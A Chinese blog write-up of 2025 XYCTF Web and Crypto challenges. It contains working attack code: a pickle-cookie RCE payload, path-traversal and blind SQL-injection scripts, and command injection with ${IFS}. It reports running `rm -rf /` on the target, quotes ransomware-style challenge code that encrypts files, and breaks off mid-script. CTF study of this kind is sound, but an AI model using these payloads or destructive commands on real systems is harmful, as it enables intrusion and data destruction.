---
title: 2025 XYCTF
date: 2025-04-04 15:28:00
tags: [CTF, Web]
categories: 题解
---

又来学 Web 了
<!--more-->

## 碎碎念

没憋住，还是看了下密码。
唉

## Web

### Signin

白盒，给了个 `main.py`，直接看代码：

```python
# -*- encoding: utf-8 -*-
'''
@File    :   main.py
@Time    :   2025/03/28 22:20:49
@Author  :   LamentXU 
'''
'''
flag in /flag_{uuid4}
'''
from bottle import Bottle, request, response, redirect, static_file, run, route
with open('../../secret.txt', 'r') as f:
    secret = f.read()

app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=8080, debug=False)
```

应该是先用文件读拿到 `secret.txt`，过滤很简单，既然不允许 `../../`，那直接 `./.././../` bypass 即可。

构造 `?filename=./.././../secret.txt` 拿到 secret 为 `'Hell0_H@cker_Y0u_A3r_Sm@r7'`。

观察了下 bottle 的源码，这个 secret 是用来签名的，只有验签通过他才会执行 `pickle.loads()`。

```python
   def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default
```

搜索得知 `pickle` 存在反序列化漏洞，最终代码如下：

```python
import base64, hmac, os, hashlib

import pickle

unicode = str
def tob(s, enc='utf8'):
    if isinstance(s, unicode):
        return s.encode(enc)
    return b'' if s is None else bytes(s)

secret = 'Hell0_H@cker_Y0u_A3r_Sm@r7'


def cookie_encode(value, secret=None, digestmod=hashlib.sha256):
    """ Return a signed cookie. To read the cookie, the same `secret` must be
        used (see :meth:`BaseResponse.get_cookie`). """
    if secret:
        # See BaseResponse.set_cookie for details on signed cookies.
        msg = base64.b64encode(value)
        hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
        return '!%s?%s' % (base64.b64encode(hash).decode(), msg.decode())
    return value


class exp():
    def __reduce__(self):
        cmd = "ls -al /"
        return (os.system, (cmd,))
    
import pickletools
payload = pickle.dumps(exp())
payload = pickletools.optimize(payload)
payload = cookie_encode(payload, secret=secret)
print(payload)
```

实现 RCE，试了半天怎么都弹不出 shell，都开始怀疑我命令到底有没有执行了，搞了个 `rm -rf /`，再读 `secret.txt`，发现文件没了，说明命令确实有执行，同时发现 `/etc/passwd` 也有权限删，直接把 flag 读到 `/etc/passwd` 里了hhh

后来执行一下 `ls /bin` 才发现根本没有 `curl`，要弹 shell 的话估计得换个方法。

`/bin/` 内容如下

```plain
arch ash base64 bbconfig busybox cat chattr chgrp chmod chown cp date dd df dmesg dnsdomainname dumpkmap echo egrep false fatattr fdflush fgrep fsync getopt grep gunzip gzip hostname ionice iostat ipcalc kbd_mode kill link linux32 linux64 ln login ls lsattr lzop makemime mkdir mknod mktemp more mount mountpoint mpstat mv netstat nice pidof ping ping6 pipe_progress printenv ps pwd reformime rev rm rmdir run-parts sed setpriv setserial sh sleep stat stty su sync tar touch true umount uname usleep watch zcat
```

### ezsql(手动滑稽)

随便试几下发现 `username` 字段可以注入，`password` 输什么都会被转义，且存在空格过滤，于是使用 `tab` 作为空格绕过，payload 如下：

```sql
username='%09OR%091=1%09#&password=1
```

跳转到 `doublecheck.php`，搞了一下发现也妹得注入
用 bp 看了一下，跳转之前 `login.php` 是有响应的，可以使用布尔盲注，注意到逗号也被过滤了，使用 `substr(xxx from x for y)` 代替 `substr(xxx, x, y)`，脚本如下：

```sql
import requests as r


url = 'http://eci-2ze3h973qy7uqodho0gc.cloudeci1.ichunqiu.com/login.php'

value = ''
i = 1

while True:
    low, high = 0, 127
    char_ascii = 0
    
    while low <= high:
        mid = (low + high) // 2

        # payload = f"' OR ascii(substr(database() from {i} for {i})) > {mid}#"   # testdb
        # payload = f"' OR ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='testdb') from {i} for {i})) > {mid}#" # double_check,user
        # payload = f"' OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='double_check') from {i} for {i})) > {mid}#" # secret
        # payload = f"' OR ascii(substr((select group_concat(secret) from double_check) from {i} for {i})) > {mid}#" # dtfrtkcc0czkoua9S
        # payload = f"' OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='user') from {i} for {i})) > {mid}#" # username,password
        # payload = f"' OR ascii(substr((select group_concat(username) from user) from {i} for {i})) > {mid}#" # yudeyoushang
        payload = f"' OR ascii(substr((select group_concat(password) from user) from {i} for {i})) > {mid}#" # zhonghengyisheng

        data = {
            'username': payload.replace(" ", "\t"),
            'password': '1'
        }

        result = r.post(url, data=data, allow_redirects=False)

        oracle = not "帐号或密码错误" in result.text
        
        if oracle:
            low = mid + 1
        else:
            high = mid - 1
    
    if high < 0:
        break
    
    char_ascii = high + 1
    if char_ascii == 0:
        break
    
    value += chr(char_ascii)
    print(f"Current: {value}")
    i += 1

print(f"Final value: {value}")
```

一点点把东西全注出来，然后用拿到的帐号密码还有 secret 直接登录，进入一个命令执行的页面，无回显，测试了一下存在空格过滤，于是用 `${IFS}` 作为空格绕过，试了一下 `sleep${IFS}2`，发现响应明显变慢了，说明可以执行，执行 `ls${IFS}/${IFS}>${IFS}flag.txt`，看到 `flag.txt` 了，直接 `cp${IFS}/flag.txt${IFS}flag.txt`，再访问 `/flag.txt` 即可。

### puzzle

打开是一个拼图网页，刷新几次发现并不能随机到初始即正确的情况，按 `F12` 发现被拦截，在 bp 看到逻辑是在 `index.html` 里的 JS 加入了对 `contextmenu` 和 `keydown` 的监听，同时发现网页引用了 `/js/puzzle.js`。
那么我们直接访问 `/js/puzzle.js`，即可绕过拦截打开控制台。
然后一看，我嘞个一大坨 JS 啊，直接把代码丢给 DeepSeek，花了几毛钱直接判断出变量 `ogde564hc3f4` 控制是否完成，本地修改一下 `ogde564hc3f4` 的值为 `true`，然后在 2 秒内随便点一下就出 flag 了：`flag{Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!}`

## Crypto

### 勒索病毒

给了一个 `task.exe` 和 `flag.txt.enc`，用 IDA 一看都是 modules 之流，用 [python-exe-unpacker](https://github.com/WithSecureLabs/python-exe-unpacker) 解包，得到的 `task` 文件就是 `task.sage`，代码如下：

```python
# @author: Crypto0

import re
import base64
import os
import sys
from gmssl import sm4
from Crypto.Util.Padding import pad
import binascii
from random import shuffle, randrange

N = 49 
p = 3
q = 128  
d = 3
assert q > (6 * d + 1) * p
R.<x> = ZZ[]
def generate_T(d1, d2):
    assert N >= d1 + d2
    s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2)
    shuffle(s)
    return R(s)

def invert_mod_prime(f, p):
    Rp = R.change_ring(Integers(p)).quotient(x^N - 1)
    return R(lift(1 / Rp(f)))

def convolution(f, g):
    return (f * g) % (x^N - 1)

def lift_mod(f, q):
    return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)])

def poly_mod(f, q):
    return R([f[i] % q for i in range(N)])

def invert_mod_pow2(f, q):
    assert q.is_power_of(2)
    g = invert_mod_prime(f, 2)
    while True:
        r = lift_mod(convolution(g, f), q)
        if r == 1:
            return g
        g = lift_mod(convolution(g, 2 - r), q)

def generate_message():
    return R([randrange(p) - 1 for _ in range(N)])

def generate_key():
    while True:
        try:
            f = generate_T(d + 1, d)
            g = generate_T(d, d)
            Fp = poly_mod(invert_mod_prime(f, p), p)
            Fq = poly_mod(invert_mod_pow2(f, q), q)
            break
        except:
            continue
    h = poly_mod(convolution(Fq, g), q)
    return h, (f, g)

def encrypt_message(m, h):
    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)
    return e

def save_ntru_keys():
    h, secret = generate_key()
    with open("pub_key.txt", "w") as f:
        f.write(str(h))
    m = generate_message()
    with open("priv_key.txt", "w") as f:
        f.write(str(m))
    e = encrypt_message(m, h)
    with open("enc.txt", "w") as f:
        f.write(str(e))

def terms(poly_str):
    terms = []
    pattern = r'([+-]?\s*x\^?\d*|[-+]?\s*\d+)'
    matches = re.finditer(pattern, poly_str.replace(' ', ''))
    
    for match in matches:
        term = match.group()
        if term == '+x' or term == 'x':
            terms.append(1)
        elif term == '-x':
            terms.append(-1)
        elif 'x^' in term:
            coeff_part = term.split('x^')[0]
            exponent = int(term.split('x^')[1])
            if not coeff_part or coeff_part == '+':
                coeff = 1
            elif coeff_part == '-':
                coeff = -1
            else:
                coeff = int(coeff_part)
            terms.append(coeff * exponent)
        elif 'x' in term:
            coeff_part = term.split('x')[0]
            if not coeff_part or coeff_part == '+':
                terms.append(1)
            elif coeff_part == '-':
                terms.append(-1)
            else:
                terms.append(int(coeff_part))
        else:
            if term == '+1' or term == '1':
                terms.append(0)
                terms.append(-0)
    return terms

def gen_key(poly_terms):
    binary = [0] * 128
    for term in poly_terms:
        exponent = abs(term)
        if term > 0 and exponent <= 127:  
            binary[127 - exponent] = 1
    binary_str = ''.join(map(str, binary))
    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)
    return hex_key

def read_polynomial_from_file(filename):
    with open(filename, 'r') as file:
        return file.read().strip()


def sm4_encrypt(key, plaintext):
    assert len(key) == 16, "SM4 key must be 16 bytes"
    cipher = sm4.CryptSM4()
    cipher.set_key(key, sm4.SM4_ENCRYPT)
    padded_plaintext = pad(plaintext, 16)
    return cipher.crypt_ecb(padded_plaintext)

def sm4_encrypt_file(input_path, output_path, key):
    with open(input_path, 'rb') as f:
        plaintext = f.read()
    
    ciphertext = sm4_encrypt(key, plaintext)
    
    with open(output_path, 'wb') as f:
        f.write(ciphertext)

def resource_path(relative_path):
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def encrypt_directory(directory, sm4_key, extensions=[".txt"]):
    if not os.path.exists(directory):
        print(f"Directory does not exist: {directory}")
        return
    
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                input_path = os.path.join(root, file)
                output_path = input_path + ".enc"
                
                try:
                    sm4_encrypt_file(input_path, output_path, sm4_key)
                    os.remove(input_path)
                    print(f"Encrypted: {input_path} -> {output_path}")
                except Exception as e:
                    print(f"Error encrypting {input_path}: {str(e)}")

def main():
    try:
        save_ntru_keys()
        poly_str = read_polynomial_from_file("priv_key.txt")
        poly_terms = terms(poly_str)
        sm4_key = binascii.unhexlify(poly_terms)
        user_name = os.getlogin()
        target_dir = os.path.join("C:\Users", user_name, "Desktop", "test_files")
        
        if not os.path.exists(target_dir):
            os.makedirs(target_dir, exist_ok=True)
            print(f"Created directory: {target_dir}")
            return
            
        txt_files = [f for f in os.listdir(target_dir) 
                    if f.endswith('.txt') and os.path.isfile(os.path.join(target_dir, f))]
        
        if not txt_files:
            print("No .txt files found in directory")
            return
            
        for txt_file in txt_files:
            file_path = os.path.join(target_dir, txt_file)
            try:
                with open(file_path, 'rb') as f:
                    test_data = f.read()
                
                ciphertext = sm4_encrypt(sm4_key, test_data)
                encrypted_path = file_path + '.enc'
                
                with open(encrypted_path, 'wb') as f:
                    f.write(ciphertext)
            except Exception as e:
                print(f"Error processing {txt_file}: {str(e)}")
                
    except Exception as e:
        print(f"Fatal error: {str(e)}")

if __name__ == "__main__":
    main()
```

但是按理说这个应该是不能跑的，不知道是不是我解包有问题，`poly_terms = terms(poly_str)` 得到的是一个 list，按理说 `binascii.unhexlify()` 是不能传的，应该是少了个 `gen_key()` 的处理。

题目总体逻辑比较简单，但是命名非常混乱，`priv_key.txt` 并不是私钥，而是一个随机的多项式，然后这个多项式被 NTRU 加密了，注意到解包出来的还有公钥 `pub_key.txt`，和加密后的多项式 `enc.txt`。
用轮子搞个私钥出来：

```python
from Crypto.Util.number import *
import time
start = time.time()
Zx.<x> = ZZ[]
n = 49
q = 128
p = 3
h = 8*x^48 + 58*x^47 + 18*x^46 + 61*x^45 + 33*x^44 + 21*x^43 + 58*x^42 + 21*x^41 + 5*x^40 + 32*x^39 + 15*x^38 + 40*x^37 + 24*x^36 + 14*x^35 + 40*x^34 + 5*x^33 + x^32 + 48*x^31 + 21*x^30 + 36*x^29 + 42*x^28 + 8*x^27 + 17*x^26 + 54*x^25 + 39*x^24 + 38*x^23 + 14*x^22 + 22*x^21 + 26*x^20 + 22*x^18 + 7*x^17 + 29*x^16 + 53*x^15 + 50*x^14 + 49*x^13 + 21*x^12 + 47*x^11 + 50*x^10 + 32*x^9 + 14*x^8 + 50*x^7 + 18*x^6 + 9*x^5 + 61*x^4 + 10*x^3 + 9*x^2 + 11*x + 47
e = 31*x^48 - 14*x^47 + x^46 + 8*x^45 - 9*x^44 - 18*x^43 - 30*x^41 + 14*x^40 + 3*x^39 - 17*x^38 + 22*x^37 + 7*x^36 + 31*x^34 - 30*x^33 - 22*x^32 - 25*x^31 + 31*x^30 - 28*x^29 + 7*x^28 + 23*x^27 - 6*x^26 + 12*x^25 - 6*x^24 + 5*x^23 - 13*x^22 - 10*x^20 + 4*x^19 + 15*x^18 + 23*x^17 + 24*x^16 - 2*x^15 - 8*x^14 - 20*x^13 + 24*x^12 - 23*x^11 - 4*x^10 - 26*x^9 - 14*x^8 + 10*x^7 + 4*x^6 - 4*x^5 - 32*x^4 - 5*x^3 - 31*x^2 + 16*x + 11
-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1

def mul(f,g):
    return (f * g) % (x^n-1)
def decrypt(pri_key,e):
    f,fp = pri_key
    a = bal_mod(mul(f,e),q)
    b = bal_mod(mul(a,fp),p)
    print(b)
    pt = ''.join([str(i) for i in b.list()])
    return pt
def bal_mod(f,q):
    g = list(((f[i] + q//2) % q) - q//2 for i in range(n))
    return Zx(g)
def lattice(h,q):
    n = 49
    # h = bal_mod(683*h,q)
    grid = Matrix(ZZ,2*n,2*n)
    cof = h.list()
    offset = 0
    for i in range(2*n):
        for j in range(2*n):
            if i<n:
                if j < n:
                    if i==j:
                        grid[i,j] = 1
                else:
                    grid[i,j] = cof[(j-n-offset)%n]
            elif j>=n and i==j:
                grid[i,j] = q
        offset += 1
    GL = grid.BKZ()
    return GL,grid

def inv_mod_prime(f,p):
    T = Zx.change_ring(Integers(p)).quotient(x^n-1)
    return Zx(lift(1 / T(f)))

GL,grid = lattice(h,q)
SVP = list(GL[0])
f = Zx(SVP[:n])
g = Zx(SVP[-n:])
a = bal_mod(mul(f,e),q)
fp = inv_mod_prime(f,p)
pv = (f,fp)

decrypt(pv,e)
```

然后存到 `priv_key.txt` 里，把 `main()` 函数改成

```python
        poly_str = read_polynomial_from_file("priv_key_1.txt")
        poly_terms = terms(poly_str)
        print(f"Polynomial Terms: {poly_terms}")
        key = gen_key(poly_terms)
        sm4_key = binascii.unhexlify(key)
        print(f"SM4 Key: {sm4_key.hex()}")
        enc = "bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835"
        enc = bytes.fromhex(enc)
        dec = sm4_decrypt(sm4_key, enc)
        print(f"Decrypted: {dec}")
```

得到 flag：`XYCTF{Crypto0_can_n0t_So1ve_it}`

### Division

```python
# -*- encoding: utf-8 -*-
'''
@File    :   server.py
@Time    :   2025/03/20 12:25:03
@Author  :   LamentXU 
'''
import random 
print('----Welcome to my division calc----')
print('''
menu:
      [1]  Division calc
      [2]  Get flag
''')
while True:
    choose = input(': >>> ')
    if choose == '1':
        try:
            denominator = int(input('input the denominator: >>> '))
        except:
            print('INPUT NUMBERS')
            continue
        nominator = random.getrandbits(32)
        if denominator == '0':
            print('NO YOU DONT')
            continue
        else:
            print(f'{nominator}//{denominator} = {nominator//denominator}')
    elif choose == '2':
        try:
            ans = input('input the answer: >>> ')
            rand1 = random.getrandbits(11000)
            rand2 = random.getrandbits(10000)
            correct_ans = rand1 // rand2
            if correct_ans == int(ans):
                print('WOW')
                with open('flag', 'r') as f:
                    print(f'Here is your flag: {f.read()}')
            else:
                print(f'NOPE, the correct answer is {correct_ans}')
        except:
            print('INPUT NUMBERS')
    else:
        print('Invalid choice')
```

MT19937 小练习，上轮子梭

```python
from pwn import *

# context.log_level = 'debug'
from tqdm import trange
import sys
sys.path.append('./MT19937-Symbolic-Execution-and-Solver-master/source')

from MT19937 import MT19937

# r = process(["python3", "server.py"])
r = remote("47.94.172.18", 36871)

data = []

for _ in trange(624):
    r.recvuntil(b'>>> ')
    r.sendline(b'1')
    r.recvuntil(b'>>> ')
    r.sendline(b'1')
    r.recvuntil(b'= ')
    data.append(int(r.recvline().strip()))

print(len(data))

rng = MT19937(state_from_data = (data, 32))

# for _ in range(624):
#     rng()
recover = [rng() for _ in range(624)]
assert recover == data, f"Recover failed: {recover} != {data}"

def getrandbits(n):
    num = 0
    for i in range(n//32):
        num = (rng() << (32 * i)) | num
    num = rng() >> (32 - (n % 32)) << n//32*32 | num
    return num

rand1 = getrandbits(11000)
rand2 = getrandbits(10000)

correct_ans = rand1 // rand2

r.recvuntil(b'>>> ')
r.sendline(b'2')
r.recvuntil(b'>>> ')
r.sendline(str(correct_ans).encode())
r.interactive()
```

### reed

呃，丢给 DeepSeek 就行了，只要存在 a 就能解出来，根本不用管 PRNG

```python
import string
from math import gcd
from pwn import *

r = remote('47.94.217.82', 26633)

table = string.ascii_letters + string.digits
m = 19198111

def decrypt(enc):
    res = []
    n = len(table)
    # 尝试不同的字符对位置
    positions = [(i, i+1) for i in range(35)]
    for pos1, pos2 in positions:
        if pos1 >= len(enc) or pos2 >= len(enc):
            continue  # 避免越界
        c0, c1 = enc[pos1], enc[pos2]
        # 遍历所有可能的明文字符对
        for i in range(n):
            p0 = i
            for j in range(n):
                if i == j:
                    continue  # 跳过相同字符对
                p1 = j
                delta_p = p1 - p0
                try:
                    inv_delta_p = pow(delta_p, -1, m)
                except ValueError:
                    continue  # 无逆元则跳过（理论上不会发生）
                a = ((c1 - c0) * inv_delta_p) % m
                if gcd(a, m) != 1:
                    continue  # a 必须与模数互质
                inv_a = pow(a, -1, m)
                b = (c0 - a * p0) % m
                # 验证所有密文字符
                valid = True
                plain = []
                for c in enc:
                    p = ((c - b) * inv_a) % m
                    if not (0 <= p < n):
                        valid = False
                        break
                    plain.append(table[p])
                if valid:
                    res.append(''.join(plain))
    return res  # 未找到解

# 示例密文（需替换为实际输出）
r.recvuntil(b'give me seed: ')
r.sendline(b'0')
enc = eval(r.recvline().strip())
print(len(enc), enc)
flag = decrypt(enc)
print(set(flag))
# XYCTF{114514fixedpointissodangerous1919810}
```

会跑出不同结果，肉眼筛选一下即可。

### Complex_signin

Coppersmith 小练习，直接把式子拆出来，然后套上多元轮子即可

```python
from sage.all import *
from coppersmith import small_roots
from Crypto.Cipher import ChaCha20
import hashlib

bits = 128
n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753
mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]
C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]
enc = b'\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe'

P = PolynomialRing(Zmod(n), names='x, y')
x, y = P.gens()
mh_re, mh_im = mh
f = -3*mh_im**2*mh_re + mh_re**3 - 3*mh_im**2*x + 3*mh_re**2*x + 3*mh_re*x**2 + x**3 - 6*mh_im*mh_re*y - 6*mh_im*x*y - 3*mh_re*y**2 - 3*x*y**2 - C[0]
roots = small_roots(f, (2**bits, 2**bits), 2, 3)
# print(roots)

m_re = mh_re + int(roots[0][0])
m_im = mh_im + int(roots[0][1])

flag = ChaCha20.new(key=hashlib.sha256(str(m_re + m_im).encode()).digest(), nonce=b'Pr3d1ctmyxjj').decrypt(enc)
print(flag.decode())
# XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}
```

### prng_xxxx

我就说这个问题肯定有人想过的，搜到[这篇文章](https://crypto.stackexchange.com/questions/80834/attacks-on-lcg-with-self-xor-output-function)

我大概翻译一下，问题形式如下：

$$
X_{i+1} = (AX_i + C) \mod 2^{n} \\\\
Y_i = (X_i/2^{n/2}) \oplus (X_i\mod 2^{n/2})
$$

解法：
Step 1
先找到 $|w_i|<W$ 使得

$$
\sum_{i=1}^{m} w_i A^i \equiv 0 \pmod{2^{n/2+k}}
$$

这里可以用一个如下形式的格做 LLL 求解：

$$
\begin{pmatrix}
1 & 0 & 0 & \cdots & 0 & KA \\\\
0 & 1 & 0 & \cdots & 0 & KA^2 \\\\
\vdots & \vdots & \vdots & \ddots & \vdots & \vdots \\\\
0 & 0 & 0 & \cdots & 1 & KA^m \\\\
0 & 0 & 0 & \cdots & 0 & K\cdot 2^{n/2+k} \\\\
\end{pmatrix}
$$

其中 $K$ 取适合大的值。

Step 2
然后猜 $X_0$ 的低 $k$ 位，若 C 未知，同步猜测 $C$ 的低 $k$ 位，依据这俩把整个 $X_i$ 推出来。

Step 3
此时可以理解成 $X_0$ 和 $C$ 的低 $k$ 位已知，用 $Y_i$ 把 $X_i$ 左半部分的低 $k$ 位也还原出来（这里没看懂的的去看[鸡块哥的文章](https://tangcuxiaojikuai.xyz/post/cb7cb618.html)），把这些位记为 $X_i^*$，即有 $X_i^* = 2^{n/2} \times \mathrm{guess}$

Step 4
推出下面的式子：

$$
\sum_{i=1}^{m} w_i [X_{i+1} - X_i] \equiv 0 \pmod{2^{n/2+k}}
$$

Step 5
计算
$$
Z = \sum_{i=1}^{m} w_i [X_{i+1}^* - X_i^*] \pmod{2^{n/2+k}}
$$
记 $\Delta$ 为 $Z$ 与 0 或 $2^{n/2+k}$ 的差值（选最小的一个）

Step 6
若 $\Delta \ge 2mW\cdot 2^{n/2}$，那对于 $X_i$ 的低 $k$ 位的猜测肯定是错的，否则就有 $1-2mW\cdot 2^{-k}$ 的概率是对的。

Step 7
对不同的 $Y_i$ 尝试所有 $2^k$ 的猜测，直接只剩下最后一个猜测，就是 $X_0$ 的低 $k$ 位。

Step 8
重复以上步骤，直到 $X_0$ 的所有位都被还原。

$k$ 应该比 $\log_2mW$ 大很多，不然 step 6 的判定就很难起作用。

按以上的方法搞一搞，最终 flag 为 `XYCTF{0h_3v3n_X0R_c@n't_s@v3_LCG!}`

代码一坨屎就先不放了，就注意一下 step 7 的意思是不用选全部的 output，比如第一轮用 $Y_0$ 到 $Y_{31}$，第二轮用 $Y_1$ 到 $Y_{32}$，第三轮用 $Y_2$ 到 $Y_{33}$，依次类推，而且实际上也不会只剩下一个，会剩下 4 至 16 个左右。

改好了，端上巧克力味的史，为了方便读者理解整个流程，没有做太多的简化

```python
from sage.all import *
from tqdm import trange
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import md5

class LCG:
    def __init__(self, seed, a, b):
        self.seed = seed
        self.a = a
        self.b = b
        self.m = 2**128

    def next(self):
        self.seed = (self.seed * self.a + self.b) % self.m
        return (self.seed >> 64) ^ (self.seed % 2**64)

class lfsr:
    # 我被裁了/(ㄒoㄒ)/~~
    pass

a = 47026247687942121848144207491837523525
output = [17861431650111939539, 15632044669542972472, 18085804805519111109, 11630394250634164303, 10914687109985225138, 7348450425255618214, 10796029302647050328, 14267824433700366397, 9363967587530173835, 8995382728269798714, 3504283765121786984, 1312349325731613524, 10716889342831891752, 12298317818779713512, 8701992888199838445, 7261196699430834071, 4670657923849978944, 9833942603152121381, 18304734854303383637, 15945503654626665549, 6509330987395005461, 223169047706410182, 12990946817252956584, 3884858487227858459, 6366350447244638553, 10326924732676590049, 12989931141522347344, 9197940263960765675, 2481604167192102429, 1409946688030505107, 9263229900540161832, 266892958530212020, 14298569012977896930, 17318088100106133211, 4224045753426648494, 650161332435727275, 9488449142549049042, 8916910451165068139, 10116136382602356010, 6604992256480748513, 7375827593997920567, 1661095751967623288, 4143230452547340203, 4145435984742575053, 10465207027576409947, 16146447204594626029, 2807803679403346199, 10857432394281592897, 1494771564147200381, 2085795265418108023, 11756240132299985418, 13802520243518071455, 1191829597542202169, 16603089856395516862, 12517247819572559598, 14148806699104849454, 8174845389550768121, 15565523852832475714, 10046639095828632930, 15353735627107824646, 7003433641698461961, 11217699328913391211, 6392630836483027655, 7918524192972397836]

n = 128
m = 32
k = 9
WW = 2
step = 9

print(k, int(log(m*WW, 2)))

def get_w(n, m, k, WW, A):
    M = matrix(ZZ, m+1, m+1)
    K = 2**200
    for i in range(m):
        M[i, i] = 1
        M[i, m] = K*a**(i+1)
    M[m, m] = K*2**(n//2+k)
    for w in M.BKZ():
        w = w[:-1]
        lhs = sum([w[i]*A**(i+1) for i in range(m)]) % 2**(n//2+k)
        if max(list(map(abs, w))) == WW and lhs == 0:
            print("Found w successfully")
            return w
    raise ValueError("No suitable w found")

# w = get_w(n, m, k, WW, a)

# known_lsb9 = None
# for windows in trange(0, 64-m):
#     candidate = []
#     for guessX0 in range(2**step):
#         for guessB in range(2**step):
#             X = [guessX0]
#             for _ in range(1, 64+1):
#                 X.append((X[-1]*a + guessB) % 2**k)
#             X_star = [((output[i] ^ X[i]) % 2**k)*2**(n//2) for i in range(64)]
#             Z = sum(w[i-windows]*(X_star[i+1] - X_star[i]) for i in range(windows, windows+m)) % 2**(n//2+k)
#             delta = min(Z, abs(Z-2**(n//2+k)))
#             if delta < 2*m*WW*2**(n//2):
#                 candidate.append((X[0], guessB))
#     if known_lsb9 is None:
#         known_lsb9 = list(set(candidate))
#     else:
#         known_lsb9 = list(set(known_lsb9) & set(candidate))
#     print(len(known_lsb9))
#     if len(known_lsb9) == 16:    # after observing, we found 16 is the minimum, even not 16 is small enough
#         break

# print(known_lsb9)

known_lsb9 = [(53, 69), (458, 255), (201, 67), (310, 1), (54, 257), (202, 255), (310, 257), (309, 325), (54, 1), (53, 325), (457, 67), (458, 511), (201, 323), (202, 511), (457, 323), (309, 69)]
known_lsb16 = []
m = 32
k = 16
WW = 3
step = 7
w = get_w(n, m, k, WW, a)
for X0low, Blow in known_lsb9:
    tmp = None
    for windows in trange(0, 64-m):
        candidate = []
        for guessX0 in range(2**step):
            for guessB in range(2**step):
                X = [guessX0*2**9 + X0low]
                guessB = guessB * 2**9 + Blow
                for _ in range(1, 64+1):
                    X.append((X[-1]*a + guessB) % 2**k)
                X_star = [((output[i] ^ X[i]) % 2**k)*2**(n//2) for i in range(64)]
                Z = sum(w[i-windows]*(X_star[i+1] - X_star[i]) for i in range(windows, windows+m)) % 2**(n//2+k)
                delta = min(Z, abs(Z-2**(n//2+k)))
                if delta < 2*m*WW*2**(n//2):
                    candidate.append((X[0], guessB))

        if tmp is None:
            tmp = list(set(candidate))
        else:
            tmp = list(set(tmp) & set(candidate))
